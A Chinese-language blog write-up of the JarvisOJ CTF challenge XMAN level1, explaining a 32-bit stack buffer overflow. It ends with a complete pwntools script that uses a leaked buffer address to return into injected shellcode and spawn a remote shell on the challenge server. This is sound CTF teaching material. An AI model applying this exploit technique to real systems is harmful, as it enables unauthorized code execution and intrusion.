---
title: XMAN level1 の Write-Up
date: 2020-05-07 14:10:04
categories:
- WriteUPs
- JarvisOJ
tags:
- PWN
- XMAN
- Stack
---
## Introduction

这是JarvisOJ的PWN题部分[XMAN]level1的Write-Up，比较简单。关键点在于当程序中没有现成的shellcode时，如何建立自己的shellcode并在buffer上布局。

<!-- more -->

## Step 1

程序运行如下图所示，可见会显示一个奇怪的地址：

![](/img/XMAN-level1/XMAN1.png)

还是一样的套路，checksec：32位程序，没有什么特殊的保护措施，并且栈上存在可读可写可执行的部分：

![](/img/XMAN-level1/XMAN2.png)

## Step 2

将程序拖到hopper disassembler中，熟悉的vulnerable_function函数：

![main函数](/img/XMAN-level1/XMAN3.png)

![vulnerable_function函数](/img/XMAN-level1/XMAN4.png)

通过vulnerable_function函数的伪C代码可以明白之前出现的那个奇怪的地址其实是泄露的buf地址，那么我们就应该有思路了：

![](/img/XMAN-level1/XMAN5.png)

首先左边是正常情况下栈中的布局情况，我们已知的是buf的起始地址。那么我们要做的是将ret的返回地址覆盖为buf的起始地址，这样我们就可以在buf中布局我们的shellcode。

右边是理想情况下我们布局后的栈中情况。

## Step 2

找到思路，下面就是EXP的编写了：

```Python
# coding:utf-8
from pwn import *

sh = remote('pwn2.jarvisoj.com', 9877)

# sh = process('./level1')
# elf = ELF('./level1')

# 获取buf地址
buf = sh.recvline()[14:22]
# 将16进制地址字符串转换成十进制的地址
buf_addr = int(buf, 16)

# 生成shellcode
shellcode = asm(shellcraft.i386.linux.sh())

payload = shellcode + "A" * (0x88 + 0x4 -len(shellcode)) + p32(buf_addr)

sh.send(payload)
sh.interactive()
sh.close()
```

执行后就可以拿到shell啦：

![](/img/XMAN-level1/XMAN6.png)
